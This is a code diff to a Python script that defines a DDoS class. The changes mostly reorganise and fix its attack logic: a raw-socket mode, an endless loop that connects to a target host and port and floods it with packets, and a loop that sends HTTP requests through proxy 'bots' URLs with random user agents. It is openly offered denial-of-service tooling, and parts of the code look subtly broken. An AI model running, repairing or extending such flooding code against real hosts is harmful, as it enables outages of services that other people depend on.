@@ -1,4 +1,22 @@
 import socket, sys, threading, random, urllib.request as urllib, time
+def TCP():
+    protocol = 'tcp'
+    return protocol
+def UDP():
+    protocol = 'udp'
+    return protocol
+def RAW():
+    protocol = 'raw'
+    return protocol
+def UTF8():
+    enc = 'utf-8'
+    return enc
+def UTF16():
+    enc = 'utf-16'
+    return enc
+def ASCII():
+    enc = 'ascii'
+    return enc
 class DDoS:
     class AdminError(Exception):
         def __init__(self, message="Check if you are running the script as admin."):
@@ -63,20 +81,23 @@ class DDoS:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         elif protocol == "raw":
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s = socket.socket(socket.AF_INET, socket.SOCK_RAW)
             except:
                 raise self.AdminError
         else:
             raise self.UnknownProtocolError()
         return s
     def sock_conn(self):
+        ip = self.host
+        port = self.port
         while True:
             try:
-                packet = self.httpheader()
-                packet = packet.encode(self.enc)
                 self.init(self.protocol)
-                ip = self.host
-                port = self.port
+                packet = self.httpheader()
+                try:
+                    packet = packet.encode(self.enc)
+                except:
+                    packet = packet.encode('utf-8')
                 s.connect((ip, port))
                 s.send(packet)
                 s.close()
@@ -86,7 +107,7 @@ class DDoS:
     def req_ddos(self):
         while True:
             try:
-                url = random.choice(self.bots())+"http://" + self.host
+                url = random.choice(self.bots()) + "http://" + self.host
                 req = urllib.urlopen(urllib.Request(url, headers={'User-Agent': random.choice(self.user_agents())}))
                 time.sleep(0.1)
             except:
@@ -101,21 +122,3 @@ class DDoS:
                 dos2.start()
             except:
                 pass
-def TCP():
-    protocol = 'tcp'
-    return protocol
-def UDP():
-    protocol = 'udp'
-    return protocol
-def RAW():
-    protocol = 'raw'
-    return protocol
-def UTF8():
-    enc = 'utf-8'
-    return enc
-def UTF16():
-    enc = 'utf-16'
-    return enc
-def ASCII():
-    enc = 'ascii'
-    return enc
